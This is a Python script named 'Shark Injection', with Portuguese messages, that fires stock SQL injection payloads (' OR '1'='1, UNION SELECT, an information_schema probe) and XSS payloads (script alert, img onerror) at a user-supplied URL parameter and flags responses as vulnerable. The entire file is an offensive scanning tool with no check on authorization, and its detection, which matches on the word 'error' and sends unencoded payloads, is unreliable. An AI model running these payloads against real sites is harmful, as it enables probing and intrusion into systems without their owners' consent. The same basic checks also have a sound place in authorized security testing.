import requests
import argparse
import re
import os
import time

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print("""
    ███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗
    ██╔════╝██║  ██║██╔══██╗██╔══██╗██║  ██║
    ███████╗███████║███████║██████╔╝███████║
    ╚════██║██╔══██║██╔══██║██╔═══╝ ██╔══██║
    ███████║██║  ██║██║  ██║██║     ██║  ██║
    ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝

      ███████╗██╗███╗   ██╗ ██████╗ ██╗  ██╗███████╗████████╗
      ██╔════╝██║████╗  ██║██╔═══██╗██║ ██╔╝██╔════╝╚══██╔══╝
      █████╗  ██║██╔██╗ ██║██║   ██║█████╔╝ █████╗     ██║   
      ██╔══╝  ██║██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝     ██║   
      ██║     ██║██║ ╚████║╚██████╔╝██║  ██╗███████╗   ██║   
      ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
    """)
    print("Developed by Drkz\n")
    time.sleep(1)

def test_sql_injection(url, param):
    payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3 --", "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --"]
    for payload in payloads:
        vuln_url = f"{url}?{param}={payload}"
        print(f"\n[+] Testando: {vuln_url}")
        response = requests.get(vuln_url)
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print("[!] Vulnerabilidade possivelmente detectada!")
            return True
    print("[-] Nenhuma vulnerabilidade detectada.")
    return False

def test_xss(url, param):
    payloads = ['<script>alert(1)</script>', '"onmouseover="alert(1)', "<img src=x onerror=alert('XSS')>"]
    for payload in payloads:
        vuln_url = f"{url}?{param}={payload}"
        print(f"\n[+] Testando XSS em: {vuln_url}")
        response = requests.get(vuln_url)
        if payload in response.text:
            print("[!] XSS DETECTADO!")
            return True
    print("[-] Nenhuma vulnerabilidade XSS detectada.")
    return False

def main():
    banner()
    parser = argparse.ArgumentParser(description="Shark Injection - Scanner de Injeção")
    parser.add_argument("-u", "--url", required=True, help="URL alvo")
    parser.add_argument("-p", "--param", required=True, help="Parâmetro vulnerável")
    parser.add_argument("--sql", action="store_true", help="Testar SQL Injection")
    parser.add_argument("--xss", action="store_true", help="Testar XSS")
    args = parser.parse_args()
    
    if args.sql:
        test_sql_injection(args.url, args.param)
    if args.xss:
        test_xss(args.url, args.param)
    if not args.sql and not args.xss:
        print("[!] Nenhuma opção de ataque escolhida. Use --sql ou --xss")

if __name__ == "__main__":
    main()
